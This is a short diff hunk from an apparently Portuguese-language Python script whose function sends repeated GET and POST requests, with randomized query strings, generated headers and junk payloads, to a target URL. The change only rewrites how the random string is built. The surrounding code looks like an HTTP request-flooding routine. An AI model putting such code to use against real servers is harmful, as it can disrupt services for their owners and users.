@@ -35,7 +35,7 @@ def disparar_requisicoes():
         for _ in range(10):
             try:
                 rota = random.choice(rotas)
-                url = alvo + rota + "?q=" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
+                url = alvo + rota + "?q=" + ''.join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(8))
                 headers = gerar_headers()
                 requests.get(url, headers=headers, timeout=1)
                 requests.post(url, headers=headers, data={"x": "A" * 500}, timeout=1)
